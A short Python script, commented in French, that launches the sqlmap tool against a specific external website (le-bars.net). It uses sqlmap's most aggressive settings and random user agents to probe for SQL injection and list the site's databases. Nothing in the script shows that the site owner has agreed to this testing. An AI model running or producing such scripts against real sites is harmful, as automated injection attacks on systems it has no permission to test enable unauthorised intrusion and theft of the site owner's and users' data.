import os

# Définir l'URL du site Web à tester
url = "http://le-bars.net"

# Définir les options de commande sqlmap
options = "-u {} --random-agent --batch --dbs --level 5 --risk 3".format(url)

# Exécuter sqlmap
os.system("python sqlmap/sqlmap.py " + options)
